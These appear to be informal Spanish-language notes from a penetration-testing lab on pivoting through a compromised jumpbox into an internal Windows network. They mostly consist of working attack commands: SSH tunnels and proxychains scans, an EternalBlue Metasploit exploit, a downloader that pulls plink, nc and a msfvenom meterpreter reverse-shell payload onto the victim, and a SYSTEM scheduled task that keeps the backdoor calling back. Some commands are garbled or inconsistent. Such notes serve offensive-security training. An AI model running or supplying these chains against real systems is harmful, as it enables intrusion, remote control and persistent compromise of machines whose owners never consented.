para crear el proxy socks en nuestra maquina
ssh (-f -N) -D 9090 n3k@181.164.184.11 -p 2222

en firefox configurar el socks host en config

antes en su lugar haciamos esto
en la maquina owneada
		nuestra		jumpbox
ssh -f -N -R 0.0.0.0:2222:127.0.0.1:22 root@mykali
en el kali aparecia en 2222
ssh -D n3k@127.0.0.1 -p 2222

ahora para proxear las herramientas
vim /etc/proxichains.conf
configuro el 9090
socks4 127.0.0.1 9090

ya tengo la config de prch y ahora uso proxychains
proxychains nmap -sT -p 21,22,80,443,445,8080 192.168.32.0/24 -Pn
esto va ejecutando el nmap a traves del proxy sock
-Pn para forzar el portscan pq el icmp no va a funcionar y el 80 y 443 no estan abiertos

445 es smb
filesharing de microsoft

hacer smb enumeration con nmap
nmap puede correr script en un lenguaje propio nse que podemos codear nosotros
hay uno de smb que escanea vuln conocidas
para ubicarlos locate *.nse (primero updatedb) con | less se ve mejor

**locate wordlist

proxychains nmap --script smb-as-discovery.nse -p 445 -sT 192.168.32.152 -Pn

otra forma de hacer el tunel
desde la maquina jumpbox
ssh -f -N -R 4445:192.168.32.152:445 root@mykali
esto en una sesion del jumpbox
ahora en mi kali se mapea el 4445 que se forwardea a la maquina visible por el jumpbox
tengo que usar mi ip publica
ahora ataco a mi maquina en ese puerto

script ms10-010 de smb checkea si es vulnerable a wannacry

si es vulnerable mapeo mi puerto y lo exploto con metasploit
no olvidar cambiar la password por defecto
mapear del router algun puerto al 22
por ej 2233
con este comando desde el jumpbox
ssh -f -N -R 4445:192.168.32.152:445 root@192.168.1.9 -p 2224
ahora quedo expuesto

entrar al router
forwarding
virtual servers
service port 2223
internal 22
eso hace el forwarding del router
buscar port forwarding

o bien
2223 a 2223 a tu ip
tirar el comando con ip del kali
netsh interface portproxy add v4tov4 listenport=2223 connectport=22 connectaddress=192.168.191.143 protocol=tcp

como mapeo el kali a la ip publica?????'
netsh interface portproxy add v4tov4 listenport=2223 connectport=22 connectaddress=192.168.191.143 protocol=tcp
este es entre windows y kali

metasploit
netstat -antp para ver los puertos
msfconsole
net

use exploit/windows/smb/ms17_010_eternalblue
set rport 4445 (mapeado)
set RHOST 127.0.0.1
show options
show targets
show payloads


exploit

falta configurar a donde vamos a mandar la shell reversa
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 9090(puerto interno forwardeado)(otro mas no el mismo que hoy)(de la ip publica al kali)
(expuesto a internet)

LHOST (ip publica)

exploit

se pudrio todo no sale nada
pq estabamos tirando a una amquina sin internet
hay que proxear por el jumpbox

ahora
set payload windows/shell_bind_tcp
exploit

set payload windows/x64/shell_bind_tcp
show options
exploit

AHORA SI
tenemos una shell en el windows

ahora hay que hacer todo lo mismo desde el windows
primero hay que subir un cliente ssh
se llama plink y ya viene en kali

------------------------------

Host vivos que responden al ping
????
Para windows
for /L %i in (1,1,100) do ping 192.168.191.%i -n 1 | findstr "Reply from";

crear un iptables en el jumpbox que diga que todo lo que va al puerto 8888
se redirija a nuestra ip publica al puerto 8000 donde tenemos un webserver
iptables -t nat -A PREROUTING -p tcp --dport 8888 -j DNAT --to-destination IpKaliPublic:8000

webserver
python -m SimpleHTTPServer 8000

OTRA COSA
vim /etc/rinetd.conf
192.168.32.141 8000 181.90.249.110 8000
/etc/init.d/rinetd start
rinetd (para correr) 

ahora desde el kali
locate plink
el plink.exe de windows-binary
copiar en el root del webserver
con el comando cp
a /usr/local

copiar el script vb en windows

para copiar el plink
cscript wget.vbs http://192.168.32.141:8001/plink.exe plink.exe

ahora hacer lo mismo con nc.exe
nc -nvv -w 1 -z 192.168.1.115 22
para ver los puertos

ahora
for %i in (22,80,445,80,8080,139,443) do nc.exe -nvv -w 1 -z 192.168.245.140 %i

PERSISTENCIAA-- para seguir la prox

desde el jumpbox conectado por ssh
vim /etc/rinetd.conf
192.168.32.141 5555 181.118.107.93 6666
rinetd

ahora tenemos mapeado el puerto del jumpbox a nuestro rputer
ahora hay que mapearlo al kali
para mi es 6666

ahora vamos a obtener una shell reversa de meterpreter
con una tarea programad q se ejecute cada 10 min

msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.32.141 lport=6666 -f exe > msfg.exe
cscript wget.vbs http://192.168.32.141:8001/msfg.exe msfg.exe

msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.32.141 lport=6666 -f exe > msfg.exe

para crear una tarea programada en windows que cree conexiones
schtasks /create /ru SYSTEM /sc MINUTE /MO 10 /tn persist /tr "\"C:\\german\\msfg.exe\""

ahora en nuestro kali lo dejamos escuchando
use exploit/multi/handler
show options
set payload windows/x64/meterpreter/reverse_tcp
show options
set lport = 6666
set lhost = iplocal
exploit

ahora mapeamos un puerto del windows al jumpbox
plink -l n3k -pw n3k 192.168.32.141 -R 8081:192.168.245.140:80

desde kali
proxychains dirb http://192.168.141.32:8081
o mejor no

hacemos un ssh directo
ssh -f -N -L 0.0.0.0:8181:127.0.0.1:8081 n3k@181.164.184.11 -p 2222

y ahora el dirb para buscar directorios
dirb http://127.0.0.1:8181/

para hacer una consulta
nc -nv 127.0.0.1 8181
GET /wordpress HTTP/1.0

dirbuster

si borramos con una regla el host header
y cambiamos la version de http a 1.0 para que no pida host header
el request pasa

